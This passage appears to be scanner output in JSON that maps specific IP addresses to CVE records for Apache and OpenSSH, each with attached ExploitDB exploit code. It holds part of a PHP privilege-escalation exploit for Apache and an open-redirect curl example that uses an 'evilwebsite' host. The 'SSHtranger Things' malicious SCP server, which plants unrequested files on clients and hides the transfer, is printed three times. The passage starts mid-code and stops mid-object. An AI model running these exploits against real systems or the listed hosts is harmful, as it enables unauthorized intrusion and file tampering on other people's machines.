simplicity\r\n\t\tif(\r\n\t\t\t(\r\n\t\t\t\tstrpos($line, 'rw-p') ||\r\n\t\t\t\tstrpos($line, 'rwxp')\r\n\t\t\t) &&\r\n            $follows_shm\r\n\t\t)\r\n\t\t{\r\n            if(strpos($line, '/lib'))\r\n            {\r\n                $follows_shm = false;\r\n                continue;\r\n            }\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$bounds = array_map('hexdec', explode('-', $line));\r\n\t\t\tif(!array_key_exists('apache', $addresses))\r\n\t\t\t    $addresses['apache'] = $bounds;\r\n\t\t\telse if($addresses['apache'][1] == $bounds[0])\r\n                $addresses['apache'][1] = $bounds[1];\r\n\t\t\telse\r\n                $follows_shm = false;\r\n\t\t}\r\n\t\tif(\r\n\t\t\tpreg_match('#(/[^\\s]+libphp7[0-9.]+.so[^\\s]*)#', $line, $matches) &&\r\n\t\t\tstrpos($line, 'r-xp')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$offset = find_symbol($matches[1], 'zend_object_std_dtor');\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$line = hexdec(explode('-', $line)[0]);\r\n\t\t\t$addresses['zend_object_std_dtor'] = $line + $offset;\r\n\t\t}\r\n\t}\r\n\r\n\t$expected = [\r\n\t\t'shm', 'system', 'libaprR', 'libaprX', 'apache', 'zend_object_std_dtor'\r\n\t];\r\n\t$missing = array_diff($expected, array_keys($addresses));\r\n\r\n\tif($missing)\r\n\t{\r\n\t\to(\r\n\t\t\t'The following addresses were not determined by parsing ' .\r\n\t\t\t'/proc/self/maps: ' . implode(', ', $missing)\r\n\t\t);\r\n\t\texit(0);\r\n\t}\r\n\r\n\r\n\to('PID: ' . getmypid());\r\n\to('Fetching addresses');\r\n\r\n\tforeach($addresses as $k => $a)\r\n\t{\r\n\t\tif(!is_array($a))\r\n\t\t\t$a = [$a];\r\n\t\to('  ' . $k . ': ' . implode('-0x', array_map(function($z) {\r\n\t\t\t\treturn '0x' . dechex($z);\r\n\t\t}, $a)));\r\n\t}\r\n\to('');\r\n\r\n\treturn $addresses;\r\n}\r\n\r\n# Extracts PIDs of apache workers using /proc/*/cmdline and /proc/*/status,\r\n# matching the cmdline and the UID\r\nfunction get_workers_pids()\r\n{\r\n\to('Obtaining apache workers PIDs');\r\n\t$pids = [];\r\n\t$cmd = file_get_contents('/proc/self/cmdline');\r\n\t$processes = glob('/proc/*');\r\n\tforeach($processes as $process)\r\n\t{\r\n\t\tif(!preg_match('#^/proc/([0-9]+)$#', $process, $match))\r\n\t\t\tcontinue;\r\n\t\t$pid = (int) $match[1];\r\n\t\tif(\r\n\t\t\t!is_readable($process . '/cmdline') ||\r\n\t\t\t!is_readable($process . '/status')\r\n\t\t)\r\n\t\t\tcontinue;\r\n\t\tif($cmd !== file_get_contents($process . '/cmdline'))\r\n\t\t\tcontinue;\r\n\r\n\t\t$status = file_get_contents($process . '/status');\r\n\t\tforeach(explode(\"\\n\", $status) as $line)\r\n\t\t{\r\n\t\t\tif(\r\n\t\t\t\tstrpos($line, 'Uid:') === 0 &&\r\n\t\t\t\tpreg_match('#\\b' . posix_getuid() . '\\b#', $line)\r\n\t\t\t)\r\n\t\t\t{\r\n\t\t\t\to('  Found apache worker: ' . $pid);\r\n\t\t\t\t$pids[$pid] = $pid;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t}\r\n\t\r\n\to('Got ' . sizeof($pids) . ' PIDs.');\r\n\to('');\r\n\r\n\treturn $pids;\r\n}\r\n\r\n$addresses = get_all_addresses();\r\n$workers_pids = get_workers_pids();\r\nreal();",
                "description": "Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation",
                "author": "cfreal",
                "_id": 46676,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2019-04-08T00:00:00+00:00",
                "cve": [
                    "CVE-2019-0211",
                    "cve-2019-0211"
                ],
                "type": "local",
                "port": 0
            }
        ]
    },
    "152.1.178.169": {
        "CVE-2014-2532": [
            {
                "source": "CVE",
                "_id": "2014-2532",
                "description": "sshd in OpenSSH before 6.6 does not properly support wildcards on AcceptEnv lines in sshd_config, which allows remote attackers to bypass intended environment restrictions by using a substring located before a wildcard character.",
                "osvdb": [],
                "bid": [
                    66355
                ],
                "cve": [
                    "CVE-2014-2532"
                ],
                "msb": []
            }
        ]
    },
    "152.1.213.48": {
        "CVE-2019-0220": [
            {
                "source": "CVE",
                "_id": "2019-0220",
                "description": "A vulnerability was found in Apache HTTP Server 2.4.0 to 2.4.38. When the path component of a request URL contains multiple consecutive slashes ('/'), directives such as LocationMatch and RewriteRule must account for duplicates in regular expressions while other aspects of the servers processing will implicitly collapse them.",
                "osvdb": [],
                "bid": [
                    107670
                ],
                "cve": [
                    "CVE-2019-0220"
                ],
                "msb": []
            }
        ],
        "CVE-2020-1927": [],
        "CVE-2019-10098": [
            {
                "source": "CVE",
                "_id": "2019-10098",
                "description": "In Apache HTTP server 2.4.0 to 2.4.39, Redirects configured with mod_rewrite that were intended to be self-referential might be fooled by encoded newlines and redirect instead to an unexpected URL within the request URL.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-10098"
                ],
                "msb": []
            },
            {
                "code": "Normal URLs like http://redirect.local/test will be forwared to https://redirect.local/test. But by using newlines (CVE 2019-10098), we can redirect somewhere else (i.e. to `https://redirect.local.evilwebsite.com`):\r\n\r\n```\r\ncurl -Ik 'https://redirect.local/%0a.evilwebsite.com' --path-as-is\r\nHTTP/2 302 \r\ndate: Mon, 28 Oct 2019 03:36:58 GMT\r\ncontent-type: text/html; charset=iso-8859-1\r\nlocation: https://redirect.local.evilwebsite.com\r\n```",
                "description": "Apache Httpd mod_rewrite - Open Redirects",
                "author": "Sebastian Neef",
                "_id": 47689,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2019-10-14T00:00:00+00:00",
                "cve": [],
                "type": "webapps",
                "port": 0
            }
        ]
    },
    "152.1.213.72": {
        "CVE-2019-6111": [
            {
                "source": "CVE",
                "_id": "2019-7283",
                "description": "An issue was discovered in rcp in NetKit through 0.17. For an rcp operation, the server chooses which files/directories are sent to the client. However, the rcp client only performs cursory validation of the object name returned. A malicious rsh server (or Man-in-The-Middle attacker) can overwrite arbitrary files in a directory on the rcp client machine. This is similar to CVE-2019-6111.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-7283"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2019-6111",
                "description": "An issue was discovered in OpenSSH 7.9. Due to the scp implementation being derived from 1983 rcp, the server chooses which files/directories are sent to the client. However, the scp client only performs cursory validation of the object name returned (only directory traversal attacks are prevented). A malicious scp server (or Man-in-The-Middle attacker) can overwrite arbitrary files in the scp client target directory. If recursive operation (-r) is performed, the server can manipulate subdirectories as well (for example, to overwrite the .ssh/authorized_keys file).",
                "osvdb": [],
                "bid": [
                    106741
                ],
                "cve": [
                    "CVE-2019-6111"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2019-25017",
                "description": "An issue was discovered in rcp in MIT krb5-appl through 1.0.3. Due to the rcp implementation being derived from 1983 rcp, the server chooses which files/directories are sent to the client. However, the rcp client only performs cursory validation of the object name returned (only directory traversal attacks are prevented). A malicious rcp server (or Man-in-The-Middle attacker) can overwrite arbitrary files in the rcp client target directory. If recursive operation (-r) is performed, the server can manipulate subdirectories as well (for example, to overwrite the .ssh/authorized_keys file). This issue is similar to CVE-2019-6111 and CVE-2019-7283. NOTE: MIT krb5-appl is not supported upstream but is shipped by a few Linux distributions. The affected code was removed from the supported MIT Kerberos 5 (aka krb5) product many years ago, at version 1.8.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-25017"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: SSHtranger Things\r\n# Date: 2019-01-17\r\n# Exploit Author: Mark E. Haase <mhaase@hyperiongray.com>\r\n# Vendor Homepage: https://www.openssh.com/\r\n# Software Link: [download link if available]\r\n# Version: OpenSSH 7.6p1\r\n# Tested on: Ubuntu 18.04.1 LTS\r\n# CVE : CVE-2019-6111, CVE-2019-6110\r\n\r\n'''\r\nTitle:     SSHtranger Things\r\nAuthor:    Mark E. Haase <mhaase@hyperiongray.com>\r\nHomepage:  https://www.hyperiongray.com\r\nDate:      2019-01-17\r\nCVE:       CVE-2019-6111, CVE-2019-6110\r\nAdvisory:  https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt\r\nTested on: Ubuntu 18.04.1 LTS, OpenSSH client 7.6p1\r\n\r\nWe have nicknamed this \"SSHtranger Things\" because the bug is so old it could be\r\nexploited by an 8-bit Demogorgon. Tested on Python 3.6.7 and requires `paramiko`\r\npackage.\r\n\r\nThe server listens on port 2222. It accepts any username and password, and it\r\ngenerates a new host key every time you run it.\r\n\r\n    $ python3 sshtranger_things.py\r\n\r\nDownload a file using a vulnerable client. The local path must be a dot:\r\n\r\n    $ scp -P 2222 foo@localhost:test.txt .\r\n    The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.\r\n    RSA key fingerprint is SHA256:C7FhMqqiMpkqG9j+11S2Wv9lQYlN1jkDiipdeFMZT1w.\r\n    Are you sure you want to continue connecting (yes/no)? yes\r\n    Warning: Permanently added '[localhost]:2222' (RSA) to the list of known hosts.\r\n    foo@localhost's password:\r\n    test.txt                                       100%   32     0.7KB/s   00:00\r\n\r\nThe file you requested (e.g. test.txt) will be saved in your current directory.\r\nIf your client is vulnerable, you will have an additional file \"exploit.txt\"\r\ncreated in your current directory.\r\n\r\n    $ cat test.txt\r\n    This is the file you requested.\r\n    $ cat exploit.txt\r\n    SSHtranger Things\r\n\r\nThe interesting code is in ScpServer.send_file().\r\n'''\r\nimport base64\r\nimport gzip\r\nimport logging\r\nimport paramiko\r\nimport paramiko.rsakey\r\nimport socket\r\nimport threading\r\n\r\nlogging.basicConfig(level=logging.INFO)\r\n\r\ndummy = 'This is the file you requested.\\n'\r\npayload = gzip.decompress(base64.b64decode(\r\n    b'H4sIAAa+QFwC/51VQW4CMQy85xV+AX+qqrZwoFSo0orbHvbQQw9NIiH1Af0YLyndjZ2x46'\r\n    b'ygaIGs43jGTjIORJfzh3nIN/IwltH1b+LHeGdxHnXUsoCWD6yYyjt7AfA1XJdLDR8u5yRA'\r\n    b'1/lEjiHbHGafXOMVpySuZaH4Jk1lgjxoocN5YMhRoNhhpA5EWMhlRHBNCWogZYhOnmk2V7'\r\n    b'C4FJgwHxKSEwEzTskrQITtj1gYIurAhWUfsDbWIFyXlRwDc8okeZkCzNyjlMmcT4wxA39d'\r\n    b'zp8OsJDJsGV/wV3I0JwJLNXKlOxJAs5Z7WwqmUZMPZmzqupttkhPRd4ovE8jE0gNyQ5skM'\r\n    b'uVy4jk4BljnYwCQ2CUs53KtnKEYkucQJIEyoGud5wYXQUuXvimAYJMJyLlqkyQHlsK6XLz'\r\n    b'I6Q6m4WKYmOzjRxEhtXWBA1qrvmBVRgGGIoT1dIRKSN+yeaJQQKuNEEadONJjkcdI2iFC4'\r\n    b'Hs55bGI12K2rn1fuN1P4/DWtuwHQYdb+0Vunt5DDpS3+0MLaN7FF73II+PK9OungPEnZrc'\r\n    b'dIyWSE9DHbnVVP4hnF2B79CqV8nTxoWmlomuzjl664HiLbZSdrtEOdIYVqBaTeKdWNccJS'\r\n    b'J+NlZGQJZ7isJK0gs27N63dPn+oefjYU/DMGy2p7en4+7w+nJ8OG0eD/vwC6VpDqYpCwAA'\r\n))\r\n\r\nclass ScpServer(paramiko.ServerInterface):\r\n    def __init__(self):\r\n        self.event = threading.Event()\r\n\r\n    def check_auth_password(self, username, password):\r\n        logging.info('Authenticated with %s:%s', username, password)\r\n        return paramiko.AUTH_SUCCESSFUL\r\n\r\n    def check_channel_request(self, kind, chanid):\r\n        logging.info('Opened session channel %d', chanid)\r\n        if kind == \"session\":\r\n            return paramiko.OPEN_SUCCEEDED\r\n        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED\r\n\r\n    def check_channel_exec_request(self, channel, command):\r\n        command = command.decode('ascii')\r\n        logging.info('Approving exec request: %s', command)\r\n        parts = command.split(' ')\r\n        # Make sure that this is a request to get a file:\r\n        assert parts[0] == 'scp'\r\n        assert '-f' in parts\r\n        file = parts[-1]\r\n        # Send file from a new thread.\r\n        threading.Thread(target=self.send_file, args=(channel, file)).start()\r\n        return True\r\n\r\n    def send_file(self, channel, file):\r\n        '''\r\n        The meat of the exploit:\r\n            1. Send the requested file.\r\n            2. Send another file (exploit.txt) that was not requested.\r\n            3. Print ANSI escape sequences to stderr to hide the transfer of\r\n               exploit.txt.\r\n        '''\r\n        def wait_ok():\r\n            assert channel.recv(1024) == b'\\x00'\r\n        def send_ok():\r\n            channel.sendall(b'\\x00')\r\n\r\n        wait_ok()\r\n\r\n        logging.info('Sending requested file \"%s\" to channel %d', file,\r\n            channel.get_id())\r\n        command = 'C0664 {} {}\\n'.format(len(dummy), file).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(dummy)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6111: whatever file the client requested, we send\r\n        # them 'exploit.txt' instead.\r\n        logging.info('Sending malicious file \"exploit.txt\" to channel %d',\r\n            channel.get_id())\r\n        command = 'C0664 {} exploit.txt\\n'.format(len(payload)).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(payload)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6110: the client will display the text that we send\r\n        # to stderr, even if it contains ANSI escape sequences. We can send\r\n        # ANSI codes that clear the current line to hide the fact that a second\r\n        # file was transmitted..\r\n        logging.info('Covering our tracks by sending ANSI escape sequence')\r\n        channel.sendall_stderr(\"\\x1b[1A\".encode('ascii'))\r\n        channel.close()\r\n\r\ndef main():\r\n    logging.info('Creating a temporary RSA host key...')\r\n    host_key = paramiko.rsakey.RSAKey.generate(1024)\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    sock.bind(('localhost', 2222))\r\n    sock.listen(0)\r\n    logging.info('Listening on port 2222...')\r\n\r\n    while True:\r\n        client, addr = sock.accept()\r\n        logging.info('Received connection from %s:%s', *addr)\r\n        transport = paramiko.Transport(client)\r\n        transport.add_server_key(host_key)\r\n        server = ScpServer()\r\n        transport.start_server(server=server)\r\n\r\nif __name__ == '__main__':\r\n    main()",
                "description": "SCP Client - Multiple Vulnerabilities (SSHtranger Things)",
                "author": "Mark E. Haase",
                "_id": 46193,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2019-01-18T00:00:00+00:00",
                "cve": [
                    "CVE-2019-6111",
                    "CVE-2019-6110"
                ],
                "type": "remote",
                "port": 0
            },
            {
                "code": "'''\r\nTitle:     SSHtranger Things\r\nAuthor:    Mark E. Haase <mhaase@hyperiongray.com>\r\nHomepage:  https://www.hyperiongray.com\r\nDate:      2019-01-17\r\nCVE:       CVE-2019-6111, CVE-2019-6110\r\nAdvisory:  https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt\r\nTested on: Ubuntu 18.04.1 LTS, OpenSSH client 7.6p1\r\n\r\nWe have nicknamed this \"SSHtranger Things\" because the bug is so old it could be\r\nexploited by an 8-bit Demogorgon. Tested on Python 3.6.7 and requires `paramiko`\r\npackage.\r\n\r\nThe server listens on port 2222. It accepts any username and password, and it\r\ngenerates a new host key every time you run it.\r\n\r\n    $ python3 sshtranger_things.py\r\n\r\nDownload a file using a vulnerable client. The local path must be a dot:\r\n\r\n    $ scp -P 2222 foo@localhost:test.txt .\r\n    The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.\r\n    RSA key fingerprint is SHA256:C7FhMqqiMpkqG9j+11S2Wv9lQYlN1jkDiipdeFMZT1w.\r\n    Are you sure you want to continue connecting (yes/no)? yes\r\n    Warning: Permanently added '[localhost]:2222' (RSA) to the list of known hosts.\r\n    foo@localhost's password:\r\n    test.txt                                       100%   32     0.7KB/s   00:00\r\n\r\nThe file you requested (e.g. test.txt) will be saved in your current directory.\r\nIf your client is vulnerable, you will have an additional file \"exploit.txt\"\r\ncreated in your current directory.\r\n\r\n    $ cat test.txt\r\n    This is the file you requested.\r\n    $ cat exploit.txt\r\n    SSHtranger Things\r\n\r\nThe interesting code is in ScpServer.send_file().\r\n'''\r\nimport base64\r\nimport gzip\r\nimport logging\r\nimport paramiko\r\nimport paramiko.rsakey\r\nimport socket\r\nimport threading\r\n\r\nlogging.basicConfig(level=logging.INFO)\r\n\r\ndummy = 'This is the file you requested.\\n'\r\npayload = gzip.decompress(base64.b64decode(\r\n    b'H4sIAAa+QFwC/51VQW4CMQy85xV+AX+qqrZwoFSo0orbHvbQQw9NIiH1Af0YLyndjZ2x46'\r\n    b'ygaIGs43jGTjIORJfzh3nIN/IwltH1b+LHeGdxHnXUsoCWD6yYyjt7AfA1XJdLDR8u5yRA'\r\n    b'1/lEjiHbHGafXOMVpySuZaH4Jk1lgjxoocN5YMhRoNhhpA5EWMhlRHBNCWogZYhOnmk2V7'\r\n    b'C4FJgwHxKSEwEzTskrQITtj1gYIurAhWUfsDbWIFyXlRwDc8okeZkCzNyjlMmcT4wxA39d'\r\n    b'zp8OsJDJsGV/wV3I0JwJLNXKlOxJAs5Z7WwqmUZMPZmzqupttkhPRd4ovE8jE0gNyQ5skM'\r\n    b'uVy4jk4BljnYwCQ2CUs53KtnKEYkucQJIEyoGud5wYXQUuXvimAYJMJyLlqkyQHlsK6XLz'\r\n    b'I6Q6m4WKYmOzjRxEhtXWBA1qrvmBVRgGGIoT1dIRKSN+yeaJQQKuNEEadONJjkcdI2iFC4'\r\n    b'Hs55bGI12K2rn1fuN1P4/DWtuwHQYdb+0Vunt5DDpS3+0MLaN7FF73II+PK9OungPEnZrc'\r\n    b'dIyWSE9DHbnVVP4hnF2B79CqV8nTxoWmlomuzjl664HiLbZSdrtEOdIYVqBaTeKdWNccJS'\r\n    b'J+NlZGQJZ7isJK0gs27N63dPn+oefjYU/DMGy2p7en4+7w+nJ8OG0eD/vwC6VpDqYpCwAA'\r\n))\r\n\r\nclass ScpServer(paramiko.ServerInterface):\r\n    def __init__(self):\r\n        self.event = threading.Event()\r\n\r\n    def check_auth_password(self, username, password):\r\n        logging.info('Authenticated with %s:%s', username, password)\r\n        return paramiko.AUTH_SUCCESSFUL\r\n\r\n    def check_channel_request(self, kind, chanid):\r\n        logging.info('Opened session channel %d', chanid)\r\n        if kind == \"session\":\r\n            return paramiko.OPEN_SUCCEEDED\r\n        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED\r\n\r\n    def check_channel_exec_request(self, channel, command):\r\n        command = command.decode('ascii')\r\n        logging.info('Approving exec request: %s', command)\r\n        parts = command.split(' ')\r\n        # Make sure that this is a request to get a file:\r\n        assert parts[0] == 'scp'\r\n        assert '-f' in parts\r\n        file = parts[-1]\r\n        # Send file from a new thread.\r\n        threading.Thread(target=self.send_file, args=(channel, file)).start()\r\n        return True\r\n\r\n    def send_file(self, channel, file):\r\n        '''\r\n        The meat of the exploit:\r\n            1. Send the requested file.\r\n            2. Send another file (exploit.txt) that was not requested.\r\n            3. Print ANSI escape sequences to stderr to hide the transfer of\r\n               exploit.txt.\r\n        '''\r\n        def wait_ok():\r\n            assert channel.recv(1024) == b'\\x00'\r\n        def send_ok():\r\n            channel.sendall(b'\\x00')\r\n\r\n        wait_ok()\r\n\r\n        logging.info('Sending requested file \"%s\" to channel %d', file,\r\n            channel.get_id())\r\n        command = 'C0664 {} {}\\n'.format(len(dummy), file).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(dummy)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6111: whatever file the client requested, we send\r\n        # them 'exploit.txt' instead.\r\n        logging.info('Sending malicious file \"exploit.txt\" to channel %d',\r\n            channel.get_id())\r\n        command = 'C0664 {} exploit.txt\\n'.format(len(payload)).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(payload)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6110: the client will display the text that we send\r\n        # to stderr, even if it contains ANSI escape sequences. We can send\r\n        # ANSI codes that clear the current line to hide the fact that a second\r\n        # file was transmitted..\r\n        logging.info('Covering our tracks by sending ANSI escape sequence')\r\n        channel.sendall_stderr(\"\\x1b[1A\".encode('ascii'))\r\n        channel.close()\r\n\r\ndef main():\r\n    logging.info('Creating a temporary RSA host key...')\r\n    host_key = paramiko.rsakey.RSAKey.generate(1024)\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    sock.bind(('localhost', 2222))\r\n    sock.listen(0)\r\n    logging.info('Listening on port 2222...')\r\n\r\n    while True:\r\n        client, addr = sock.accept()\r\n        logging.info('Received connection from %s:%s', *addr)\r\n        transport = paramiko.Transport(client)\r\n        transport.add_server_key(host_key)\r\n        server = ScpServer()\r\n        transport.start_server(server=server)\r\n\r\nif __name__ == '__main__':\r\n    main()",
                "description": "OpenSSH SCP Client - Write Arbitrary Files",
                "author": "Harry Sintonen",
                "_id": 46516,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2019-01-11T00:00:00+00:00",
                "cve": [
                    "CVE-2019-6111",
                    "CVE-2019-6110"
                ],
                "type": "remote",
                "port": 0
            }
        ],
        "CVE-2019-6110": [
            {
                "source": "CVE",
                "_id": "2019-6110",
                "description": "In OpenSSH 7.9, due to accepting and displaying arbitrary stderr output from the server, a malicious server (or Man-in-The-Middle attacker) can manipulate the client output, for example to use ANSI control codes to hide additional files being transferred.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-6110"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: SSHtranger Things\r\n# Date: 2019-01-17\r\n# Exploit Author: Mark E. Haase <mhaase@hyperiongray.com>\r\n# Vendor Homepage: https://www.openssh.com/\r\n# Software Link: [download link if available]\r\n# Version: OpenSSH 7.6p1\r\n# Tested on: Ubuntu 18.04.1 LTS\r\n# CVE : CVE-2019-6111, CVE-2019-6110\r\n\r\n'''\r\nTitle:     SSHtranger Things\r\nAuthor:    Mark E. Haase <mhaase@hyperiongray.com>\r\nHomepage:  https://www.hyperiongray.com\r\nDate:      2019-01-17\r\nCVE:       CVE-2019-6111, CVE-2019-6110\r\nAdvisory:  https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt\r\nTested on: Ubuntu 18.04.1 LTS, OpenSSH client 7.6p1\r\n\r\nWe have nicknamed this \"SSHtranger Things\" because the bug is so old it could be\r\nexploited by an 8-bit Demogorgon. Tested on Python 3.6.7 and requires `paramiko`\r\npackage.\r\n\r\nThe server listens on port 2222. It accepts any username and password, and it\r\ngenerates a new host key every time you run it.\r\n\r\n    $ python3 sshtranger_things.py\r\n\r\nDownload a file using a vulnerable client. The local path must be a dot:\r\n\r\n    $ scp -P 2222 foo@localhost:test.txt .\r\n    The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.\r\n    RSA key fingerprint is SHA256:C7FhMqqiMpkqG9j+11S2Wv9lQYlN1jkDiipdeFMZT1w.\r\n    Are you sure you want to continue connecting (yes/no)? yes\r\n    Warning: Permanently added '[localhost]:2222' (RSA) to the list of known hosts.\r\n    foo@localhost's password:\r\n    test.txt                                       100%   32     0.7KB/s   00:00\r\n\r\nThe file you requested (e.g. test.txt) will be saved in your current directory.\r\nIf your client is vulnerable, you will have an additional file \"exploit.txt\"\r\ncreated in your current directory.\r\n\r\n    $ cat test.txt\r\n    This is the file you requested.\r\n    $ cat exploit.txt\r\n    SSHtranger Things\r\n\r\nThe interesting code is in ScpServer.send_file().\r\n'''\r\nimport base64\r\nimport gzip\r\nimport logging\r\nimport paramiko\r\nimport paramiko.rsakey\r\nimport socket\r\nimport threading\r\n\r\nlogging.basicConfig(level=logging.INFO)\r\n\r\ndummy = 'This is the file you requested.\\n'\r\npayload = gzip.decompress(base64.b64decode(\r\n    b'H4sIAAa+QFwC/51VQW4CMQy85xV+AX+qqrZwoFSo0orbHvbQQw9NIiH1Af0YLyndjZ2x46'\r\n    b'ygaIGs43jGTjIORJfzh3nIN/IwltH1b+LHeGdxHnXUsoCWD6yYyjt7AfA1XJdLDR8u5yRA'\r\n    b'1/lEjiHbHGafXOMVpySuZaH4Jk1lgjxoocN5YMhRoNhhpA5EWMhlRHBNCWogZYhOnmk2V7'\r\n    b'C4FJgwHxKSEwEzTskrQITtj1gYIurAhWUfsDbWIFyXlRwDc8okeZkCzNyjlMmcT4wxA39d'\r\n    b'zp8OsJDJsGV/wV3I0JwJLNXKlOxJAs5Z7WwqmUZMPZmzqupttkhPRd4ovE8jE0gNyQ5skM'\r\n    b'uVy4jk4BljnYwCQ2CUs53KtnKEYkucQJIEyoGud5wYXQUuXvimAYJMJyLlqkyQHlsK6XLz'\r\n    b'I6Q6m4WKYmOzjRxEhtXWBA1qrvmBVRgGGIoT1dIRKSN+yeaJQQKuNEEadONJjkcdI2iFC4'\r\n    b'Hs55bGI12K2rn1fuN1P4/DWtuwHQYdb+0Vunt5DDpS3+0MLaN7FF73II+PK9OungPEnZrc'\r\n    b'dIyWSE9DHbnVVP4hnF2B79CqV8nTxoWmlomuzjl664HiLbZSdrtEOdIYVqBaTeKdWNccJS'\r\n    b'J+NlZGQJZ7isJK0gs27N63dPn+oefjYU/DMGy2p7en4+7w+nJ8OG0eD/vwC6VpDqYpCwAA'\r\n))\r\n\r\nclass ScpServer(paramiko.ServerInterface):\r\n    def __init__(self):\r\n        self.event = threading.Event()\r\n\r\n    def check_auth_password(self, username, password):\r\n        logging.info('Authenticated with %s:%s', username, password)\r\n        return paramiko.AUTH_SUCCESSFUL\r\n\r\n    def check_channel_request(self, kind, chanid):\r\n        logging.info('Opened session channel %d', chanid)\r\n        if kind == \"session\":\r\n            return paramiko.OPEN_SUCCEEDED\r\n        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED\r\n\r\n    def check_channel_exec_request(self, channel, command):\r\n        command = command.decode('ascii')\r\n        logging.info('Approving exec request: %s', command)\r\n        parts = command.split(' ')\r\n        # Make sure that this is a request to get a file:\r\n        assert parts[0] == 'scp'\r\n        assert '-f' in parts\r\n        file = parts[-1]\r\n        # Send file from a new thread.\r\n        threading.Thread(target=self.send_file, args=(channel, file)).start()\r\n        return True\r\n\r\n    def send_file(self, channel, file):\r\n        '''\r\n        The meat of the exploit:\r\n            1. Send the requested file.\r\n            2. Send another file (exploit.txt) that was not requested.\r\n            3. Print ANSI escape sequences to stderr to hide the transfer of\r\n               exploit.txt.\r\n        '''\r\n        def wait_ok():\r\n            assert channel.recv(1024) == b'\\x00'\r\n        def send_ok():\r\n            channel.sendall(b'\\x00')\r\n\r\n        wait_ok()\r\n\r\n        logging.info('Sending requested file \"%s\" to channel %d', file,\r\n            channel.get_id())\r\n        command = 'C0664 {} {}\\n'.format(len(dummy), file).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(dummy)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6111: whatever file the client requested, we send\r\n        # them 'exploit.txt' instead.\r\n        logging.info('Sending malicious file \"exploit.txt\" to channel %d',\r\n            channel.get_id())\r\n        command = 'C0664 {} exploit.txt\\n'.format(len(payload)).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(payload)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6110: the client will display the text that we send\r\n        # to stderr, even if it contains ANSI escape sequences. We can send\r\n        # ANSI codes that clear the current line to hide the fact that a second\r\n        # file was transmitted..\r\n        logging.info('Covering our tracks by sending ANSI escape sequence')\r\n        channel.sendall_stderr(\"\\x1b[1A\".encode('ascii'))\r\n        channel.close()\r\n\r\ndef main():\r\n    logging.info('Creating a temporary RSA host key...')\r\n    host_key = paramiko.rsakey.RSAKey.generate(1024)\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    sock.bind(('localhost', 2222))\r\n    sock.listen(0)\r\n    logging.info('Listening on port 2222...')\r\n\r\n    while True:\r\n        client, addr = sock.accept()\r\n        logging.info('Received connection from %s:%s', *addr)\r\n        transport = paramiko.Transport(client)\r\n        transport.add_server_key(host_key)\r\n        server = ScpServer()\r\n        transport.start_server(server=server)\r\n\r\nif __name__ == '__main__':\r\n    main()",
                "description": "SCP Client - Multiple Vulnerabilities (SSHtranger Things)",
                "author": "Mark E. Haase",
                "_id": 46193,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2019-01-18T00:00:00+00:00",
                "cve": [
                    "CVE-2019-6111",
                    "CVE-2019-6110"
                ],
                "type": "remote",
                "port": 0
            },
            {
